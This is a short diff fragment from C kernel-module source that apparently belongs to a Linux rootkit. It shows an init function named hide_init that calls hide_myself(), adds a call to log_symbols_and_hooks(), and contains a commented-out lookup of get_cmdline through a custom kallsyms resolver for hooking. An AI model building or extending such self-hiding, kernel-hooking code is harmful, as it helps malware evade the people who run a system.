@@ -450,6 +450,8 @@ static int __init hide_init(void)
     }
 
 	hide_myself();
+
+	log_symbols_and_hooks();
 /*
 	if (my_get_cmdline == NULL) {
         my_get_cmdline = (void *) kallsyms_lookup_nameX("get_cmdline");
